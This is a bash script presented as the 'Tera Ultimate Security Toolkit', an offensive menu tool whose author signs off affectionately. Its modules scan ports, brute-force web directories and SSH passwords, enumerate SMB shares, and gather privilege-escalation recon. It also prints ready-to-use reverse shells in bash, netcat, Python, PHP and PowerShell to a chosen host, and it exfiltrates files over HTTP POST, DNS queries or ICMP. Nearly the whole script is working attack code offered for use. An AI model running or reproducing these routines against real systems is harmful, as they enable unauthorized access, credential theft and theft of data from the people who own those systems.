#!/usr/bin/env bash

# ==============================================================================
# Tera Ultimate Security Toolkit )
# ==============================================================================

# --- Configuration ---
VERSION="BETA / IN DEV"
LOG_FILE="tera_$(date +%Y%m%d_%H%M%S).log"
THREADS=50
TIMEOUT=2

# --- Colors ---
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# --- Logging ---
log() {
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# --- Banner ---
show_banner() {
    clear
    echo -e "${CYAN}
    ╔══════════════════════════════════════════════════════════╗
    ║        TERA v$VERSION    / Love yall so much        ║
    ╚══════════════════════════════════════════════════════════╝
    ${NC}"
}

# --- Input Validation ---
validate_ip() {
    local ip=$1
    local stat=1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        [[ ${octets[0]} -le 255 && ${octets[1]} -le 255 && ${octets[2]} -le 255 && ${octets[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

validate_url() {
    local url=$1
    [[ $url =~ ^https?:// ]] || url="http://$url"
    curl -s --head "$url" --max-time 5 > /dev/null 2>&1
    return $?
}

# --- 1. Advanced Port Scanner (TCP/UDP) ---
port_scanner() {
    echo -e "${BLUE}[*] Port Scanner${NC}"
    read -p "Target IP/Domain: " target
    read -p "Range (e.g. 1-1000): " range
    read -p "Protocol (tcp/udp/both) [tcp]: " protocol
    protocol=${protocol:-tcp}
    
    IFS='-' read -r start end <<< "$range"
    if [[ -z $start ]] || [[ -z $end ]]; then
        log "[ERROR] Invalid port range"
        return 1
    fi
    
    echo -e "${BLUE}[*] Scanning $target ($protocol)...${NC}"
    
    scan_tcp() {
        local port=$1
        timeout $TIMEOUT bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && \
        echo -e "${GREEN}[+] TCP/$port Open${NC}" && \
        # Service detection
        service=$(timeout 2 bash -c "echo '' | nc -w 1 $target $port 2>/dev/null | head -1")
        [[ -n $service ]] && echo -e "    Service: $service"
    }
    
    export -f scan_tcp
    export target TIMEOUT GREEN NC
    
    if [[ $protocol == "tcp" ]] || [[ $protocol == "both" ]]; then
        echo -e "${YELLOW}[*] Scanning TCP ports...${NC}"
        seq $start $end | xargs -I {} -P $THREADS bash -c 'scan_tcp "$@"' _ {}
    fi
    
    if [[ $protocol == "udp" ]] || [[ $protocol == "both" ]]; then
        echo -e "${YELLOW}[*] Scanning UDP ports (slow)...${NC}"
        for port in $(seq $start $end); do
            timeout $TIMEOUT bash -c "echo '' > /dev/udp/$target/$port" 2>/dev/null && \
            echo -e "${GREEN}[+] UDP/$port Open${NC}" &
        done
        wait
    fi
}

# --- 2. Enhanced Directory Bruter ---
dir_brute() {
    echo -e "${BLUE}[*] Directory Bruteforce${NC}"
    read -p "URL: " url
    read -p "Wordlist [common.txt]: " wl
    wl=${wl:-common.txt}
    read -p "Extensions (comma separated) [php,html,js]: " exts
    exts=${exts:-php,html,js}
    
    [[ $url != http* ]] && url="http://$url"
    
    if ! validate_url "$url"; then
        echo -e "${RED}[!] Target unreachable${NC}"
        return 1
    fi
    
    echo -e "${BLUE}[*] Starting directory brute on $url${NC}"
    
    IFS=',' read -ra EXT_ARRAY <<< "$exts"
    
    while read -r dir; do
        # Test directory
        status=$(curl -s -o /dev/null -w "%{http_code}" -L "$url/$dir/" 2>/dev/null)
        if [[ "$status" =~ ^(200|301|302|403)$ ]]; then
            size=$(curl -s -I "$url/$dir/" 2>/dev/null | grep -i 'content-length' | awk '{print $2}' | tr -d '\r')
            echo -e "${GREEN}[+] /$dir/ ($status) [${size:-?} bytes]${NC}"
        fi
        
        # Test files with extensions
        for ext in "${EXT_ARRAY[@]}"; do
            status=$(curl -s -o /dev/null -w "%{http_code}" "$url/$dir.$ext" 2>/dev/null)
            if [[ "$status" =~ ^(200|301|302|403)$ ]]; then
                echo -e "${GREEN}[+] /$dir.$ext ($status)${NC}"
            fi
        done
    done < "$wl" | head -100
}

# --- 3. Enhanced SMB Enumerator ---
smb_enum() {
    echo -e "${BLUE}[*] SMB Enumerator${NC}"
    read -p "Target IP: " ip
    
    if ! validate_ip "$ip"; then
        echo -e "${RED}[!] Invalid IP address${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Running Nmap SMB scripts...${NC}"
    if command -v nmap &> /dev/null; then
        nmap -p 445 --script smb-enum-shares,smb-os-discovery,smb-vuln-* "$ip"
    fi
    
    echo -e "${YELLOW}[*] Trying SMB client...${NC}"
    if command -v smbclient &> /dev/null; then
        echo -e "${CYAN}[-] Null session:${NC}"
        smbclient -L "//$ip/" -N 2>/dev/null || echo "Null session failed"
        
        echo -e "${CYAN}[-] Guest session:${NC}"
        smbclient -L "//$ip/" -U "guest%" 2>/dev/null || echo "Guest session failed"
    fi
}

# --- 4. Advanced Subdomain Finder ---
sub_finder() {
    echo -e "${BLUE}[*] Subdomain Finder${NC}"
    read -p "Domain (e.g. example.com): " dom
    read -p "Wordlist [subdomains.txt]: " wl
    wl=${wl:-subdomains.txt}
    
    echo -e "${BLUE}[*] Hunting subdomains for $dom...${NC}"
    
    # Using multiple methods
    found_subs=()
    
    # Method 1: Bruteforce
    while read -r sub; do
        host="$sub.$dom"
        if host "$host" > /dev/null 2>&1; then
            echo -e "${GREEN}[+] Found: $host${NC}"
            found_subs+=("$host")
        fi
    done < "$wl" &
    
    # Method 2: Certificate Transparency (if curl is available)
    if command -v curl &> /dev/null; then
        echo -e "${YELLOW}[*] Checking crt.sh...${NC}"
        curl -s "https://crt.sh/?q=%25.$dom&output=json" | jq -r '.[].name_value' 2>/dev/null | \
            sed 's/\*\.//g' | sort -u | while read -r sub; do
            echo -e "${GREEN}[+] CRT: $sub${NC}"
            found_subs+=("$sub")
        done
    fi
    
    wait
    
    # Display summary
    echo -e "${YELLOW}[*] Found ${#found_subs[@]} unique subdomains${NC}"
    printf '%s\n' "${found_subs[@]}" | sort -u
}

# --- 5. Enhanced SSH Brute Force ---
ssh_brute() {
    echo -e "${BLUE}[*] SSH Brute Force${NC}"
    read -p "Target IP: " ip
    read -p "Username [root]: " user
    user=${user:-root}
    read -p "Wordlist [passwords.txt]: " wl
    wl=${wl:-passwords.txt}
    
    if ! validate_ip "$ip"; then
        echo -e "${RED}[!] Invalid IP address${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Testing SSH on $ip...${NC}"
    
    # Check if SSH is open
    if ! timeout 2 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then
        echo -e "${RED}[!] Port 22 closed${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] SSH port open, starting brute...${NC}"
    
    attempt=0
    while read -r pass; do
        ((attempt++))
        echo -ne "${BLUE}[*] Attempt $attempt: $pass\r${NC}"
        
        if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
           -o ConnectTimeout=3 \
           -o PasswordAuthentication=yes \
           "$user@$ip" "exit" 2>/dev/null; then
            echo -e "\n${GREEN}[!] SUCCESS: $user:$pass${NC}"
            echo "$user:$pass" >> "found_ssh_$ip.txt"
            return 0
        fi
    done < "$wl"
    
    echo -e "\n${RED}[!] No valid credentials found${NC}"
}

# --- 6. Advanced PrivEsc Check ---
priv_esc_check() {
    echo -e "${BLUE}[*] Privilege Escalation Check${NC}"
    
    # System Info
    echo -e "${YELLOW}--- System Information ---${NC}"
    uname -a
    cat /etc/*-release 2>/dev/null || echo "No release info"
    
    # Kernel Exploits
    echo -e "${YELLOW}--- Kernel Version ---${NC}"
    uname -r
    
    # Users
    echo -e "${YELLOW}--- Users & Groups ---${NC}"
    echo "Current user: $(whoami)"
    echo "UID: $(id -u)"
    echo "Groups: $(id -Gn)"
    echo "Sudo without password: $(sudo -l 2>/dev/null | grep -i nopasswd || echo 'None')"
    
    # SUID Binaries
    echo -e "${YELLOW}--- SUID Binaries ---${NC}"
    find / -perm -4000 -type f 2>/dev/null | head -20
    echo -e "${CYAN}[*] Checking dangerous SUID...${NC}"
    find / -perm -4000 -type f 2>/dev/null | xargs -I {} sh -c 'echo "{}: $({} --help 2>&1 | head -1)"' | \
        grep -i -E '(bash|sh|perl|python|php|ruby|awk|find|vim|nmap|nano)' || echo "None found"
    
    # Writable Files
    echo -e "${YELLOW}--- Writable Files/Dirs ---${NC}"
    find / -writable -type d 2>/dev/null | grep -v -E '(proc|sys|dev)' | head -10
    
    # Cron Jobs
    echo -e "${YELLOW}--- Cron Jobs ---${NC}"
    crontab -l 2>/dev/null || echo "No user cron"
    ls -la /etc/cron* 2>/dev/null | head -20
    
    # Network
    echo -e "${YELLOW}--- Network Info ---${NC}"
    ip a 2>/dev/null || ifconfig 2>/dev/null
    netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null
    
    # Password Files
    echo -e "${YELLOW}--- Password Files ---${NC}"
    ls -la /etc/passwd /etc/shadow 2>/dev/null
    
    # Save to file
    echo -e "${GREEN}[+] Report saved to privcheck_$(hostname)_$(date +%Y%m%d).txt${NC}"
}

# --- 7. Enhanced Web Crawler ---
web_crawler() {
    echo -e "${BLUE}[*] Web Crawler${NC}"
    read -p "URL: " url
    read -p "Depth [1]: " depth
    depth=${depth:-1}
    
    [[ $url != http* ]] && url="http://$url"
    
    if ! validate_url "$url"; then
        echo -e "${RED}[!] Target unreachable${NC}"
        return 1
    fi
    
    crawl() {
        local current_url=$1
        local current_depth=$2
        
        if [[ $current_depth -gt $depth ]]; then
            return
        fi
        
        echo -e "${YELLOW}[Depth $current_depth] Crawling: $current_url${NC}"
        
        # Extract links
        links=$(curl -s "$current_url" | grep -oP 'href="\K[^"]+' | \
                grep -E '^(http|https|/|\./)' | sort -u)
        
        for link in $links; do
            # Convert relative to absolute
            if [[ $link == /* ]]; then
                domain=$(echo "$current_url" | cut -d'/' -f1-3)
                link="$domain$link"
            elif [[ $link == ./* ]]; then
                link="$current_url/${link:2}"
            fi
            
            # Check if already visited
            if ! grep -q "$link" crawled.txt 2>/dev/null; then
                echo "$link" >> crawled.txt
                echo -e "${GREEN}[+] $link${NC}"
                
                # Recursive crawl
                if [[ $current_depth -lt $depth ]]; then
                    crawl "$link" $((current_depth + 1))
                fi
            fi
        done
    }
    
    > crawled.txt
    crawl "$url" 1
    echo -e "${BLUE}[*] Found $(wc -l < crawled.txt) unique links${NC}"
}

# --- 8. Enhanced Reverse Shell Generator ---
rev_gen() {
    echo -e "${BLUE}[*] Reverse Shell Generator${NC}"
    read -p "LHOST: " lh
    read -p "LPORT: " lp
    
    echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Bash:${NC}"
    echo "bash -i >& /dev/tcp/$lh/$lp 0>&1"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f"
    
    echo -e "${YELLOW}Python:${NC}"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    
    echo -e "${YELLOW}PHP:${NC}"
    echo "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    
    echo -e "${YELLOW}Netcat:${NC}"
    echo "nc -e /bin/sh $lh $lp"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f"
    
    echo -e "${YELLOW}PowerShell:${NC}"
    echo "\$client = New-Object System.Net.Sockets.TCPClient(\"$lh\",$lp);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};\$sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as \" + \$env:username + \" on \" + \$env:computername + \"`n`n\");\$stream.Write(\$sendbytes,0,\$sendbytes.Length);\$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ');\$stream.Write(\$sendbytes,0,\$sendbytes.Length);while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (Get-Location).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    
    echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
}

# --- 9. Enhanced Packet Sniffer ---
packet_sniff() {
    echo -e "${BLUE}[*] Packet Sniffer${NC}"
    
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Requires root privileges${NC}"
        return 1
    fi
    
    read -p "Interface [$(ip route | grep default | cut -d' ' -f5)]: " int
    int=${int:-$(ip route | grep default | cut -d' ' -f5)}
    read -p "Filter [tcp port 80 or tcp port 443]: " filter
    filter=${filter:-"tcp port 80 or tcp port 443"}
    read -p "Output file [capture.pcap]: " outfile
    outfile=${outfile:-capture.pcap}
    
    echo -e "${YELLOW}[*] Starting capture on $int...${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C to stop${NC}"
    
    trap 'echo -e "\n${GREEN}[+] Capture saved to $outfile${NC}"; exit 0' INT
    
    if command -v tcpdump &> /dev/null; then
        tcpdump -i "$int" -s 0 -w "$outfile" "$filter"
    else
        echo -e "${RED}[!] tcpdump not found${NC}"
    fi
}

# --- 10. Enhanced Data Exfiltrator ---
exfiltrate() {
    echo -e "${BLUE}[*] Data Exfiltration${NC}"
    read -p "File to exfiltrate: " file
    
    if [[ ! -f "$file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        return 1
    fi
    
    echo -e "${CYAN}[*] Choose method:${NC}"
    echo "1) HTTP POST"
    echo "2) DNS Query"
    echo "3) ICMP Ping"
    read -p "Method [1]: " method
    method=${method:-1}
    
    case $method in
        1)
            read -p "Receiver URL: " r_url
            data=$(base64 -w 0 "$file")
            filename=$(basename "$file")
            curl -X POST -H "Content-Type: application/json" \
                 -d "{\"filename\":\"$filename\",\"data\":\"$data\"}" \
                 "$r_url" && echo -e "${GREEN}[+] Sent via HTTP${NC}"
            ;;
        2)
            read -p "Domain to use: " domain
            # Split data into chunks for DNS
            encoded=$(base64 -w 0 "$file" | xxd -p -c 32)
            chunk=0
            for part in $(echo "$encoded" | fold -w 30); do
                dig "@8.8.8.8" "${part}.${domain}" > /dev/null 2>&1
                echo -ne "${BLUE}[*] Sent chunk $((++chunk))\r${NC}"
                sleep 0.1
            done
            echo -e "\n${GREEN}[+] Sent via DNS${NC}"
            ;;
        3)
            read -p "Target IP: " target_ip
            # Simple ICMP exfil (size limited)
            encoded=$(base64 -w 0 "$file" | tr -d '\n')
            for i in $(seq 0 $((${#encoded}/16))); do
                chunk="${encoded:$((i*16)):16}"
                ping -c 1 -p "$(echo -n "$chunk" | xxd -r -p | xxd -p)" "$target_ip" > /dev/null 2>&1
                echo -ne "${BLUE}[*] Sent packet $((i+1))\r${NC}"
            done
            echo -e "\n${GREEN}[+] Sent via ICMP${NC}"
            ;;
    esac
}

# --- 11. Enhanced Ping Sweep ---
ping_sweep() {
    echo -e "${BLUE}[*] Network Discovery${NC}"
    read -p "Network CIDR [192.168.1.0/24]: " network
    network=${network:-192.168.1.0/24}
    
    echo -e "${YELLOW}[*] Discovering hosts in $network...${NC}"
    
    # Multiple methods
    if command -v nmap &> /dev/null; then
        echo -e "${CYAN}[*] Using nmap...${NC}"
        nmap -sn "$network" | grep -oP 'Nmap scan report for \K[^ ]*' | \
            while read -r host; do echo -e "${GREEN}[+] Alive: $host${NC}"; done
    elif command -v fping &> /dev/null; then
        echo -e "${CYAN}[*] Using fping...${NC}"
        fping -a -g "$network" 2>/dev/null | while read -r host; do
            echo -e "${GREEN}[+] Alive: $host${NC}"
        done
    else
        echo -e "${CYAN}[*] Using ping...${NC}"
        # Extract network range
        base=$(echo "$network" | cut -d'/' -f1)
        mask=$(echo "$network" | cut -d'/' -f2)
        
        if [[ $mask == "24" ]]; then
            subnet=$(echo "$base" | cut -d'.' -f1-3)
            for i in {1..254}; do
                host="$subnet.$i"
                ping -c 1 -W 1 "$host" > /dev/null 2>&1 && \
                echo -e "${GREEN}[+] Alive: $host${NC}" &
            done
            wait
        fi
    fi
}

# --- 12. New: Vulnerability Scanner ---
vuln_scan() {
    echo -e "${BLUE}[*] Basic Vulnerability Scan${NC}"
    read -p "Target IP/Domain: " target
    
    if validate_ip "$target"; then
        echo -e "${YELLOW}[*] Scanning $target for common vulnerabilities...${NC}"
        
        # Check for open ports
        echo -e "${CYAN}[*] Port scan...${NC}"
        for port in 21 22 23 25 80 443 445 3389; do
            timeout 1 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && \
            echo -e "${GREEN}[+] Port $port open${NC}" && \
            case $port in
                21) echo "   FTP service" ;;
                22) echo "   SSH service" ;;
                80|443) echo "   Web service" ;;
                445) echo "   SMB service" ;;
            esac
        done
        
        # Quick web vulnerability check
        if timeout 2 bash -c "echo > /dev/tcp/$target/80" 2>/dev/null; then
            echo -e "${CYAN}[*] Basic web checks...${NC}"
            curl -s "http://$target/robots.txt" | grep -q "Disallow" && \
                echo -e "${GREEN}[+] robots.txt found${NC}"
        fi
    fi
}

# --- Main Menu ---
main_menu() {
    while true; do
        show_banner
        echo -e "${CYAN}
    ╔══════════════════════════════════════════════════════════╗
    ║                         MAIN MENU                       ║ side note = by fevber love yall ❤️
    ╠══════════════════════════════════════════════════════════╣
    ║  1) Port Scanner          8) Reverse Shell Generator  ║
    ║  2) Directory Brute       9) Packet Sniffer (Root)       ║
    ║  3) SMB Enumerator        10) Data Exfiltration        ║
    ║  4) Subdomain Finder      11) Network Discover     ║
    ║  5) SSH Brute Force       12) Vulnerability Scanner ║
    ║  6) Privilege Escalation  13) Web Crawler                ║
    ║  7) Report Viewer         0) Exit                                      ║
    ╚══════════════════════════════════════════════════════════╝
    ${NC}"
        
        read -p "Select option [0-13]: " choice
        
        case $choice in
            1) port_scanner ;;
            2) dir_brute ;;
            3) smb_enum ;;
            4) sub_finder ;;
            5) ssh_brute ;;
            6) priv_esc_check ;;
            7) 
                [[ -f "$LOG_FILE" ]] && less "$LOG_FILE" || echo "No logs yet"
                ;;
            8) rev_gen ;;
            9) packet_sniff ;;
            10) exfiltrate ;;
            11) ping_sweep ;;
            12) vuln_scan ;;
            13) web_crawler ;;
            0) 
                echo -e "${GREEN}[*] Exiting...${NC}"
                echo -e "${CYAN}[*] Log file: $LOG_FILE${NC}"
                exit 0
                ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        
        echo -e "\n${YELLOW}Press Enter to continue...${NC}"
        read -r
    done
}

# --- Initial Checks ---
check_dependencies() {
    local deps=("curl" "bash")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Missing dependencies: ${missing[*]}${NC}"
        read -p "Attempt to install? [y/N]: " install
        if [[ $install =~ ^[Yy]$ ]]; then
            if command -v apt &> /dev/null; then
                sudo apt update && sudo apt install -y "${missing[@]}"
            elif command -v yum &> /dev/null; then
                sudo yum install -y "${missing[@]}"
            fi
        fi
    fi
}

# --- Start ---
trap 'echo -e "\n${RED}[!] Interrupted${NC}"; exit 1' INT

check_dependencies
main_menu
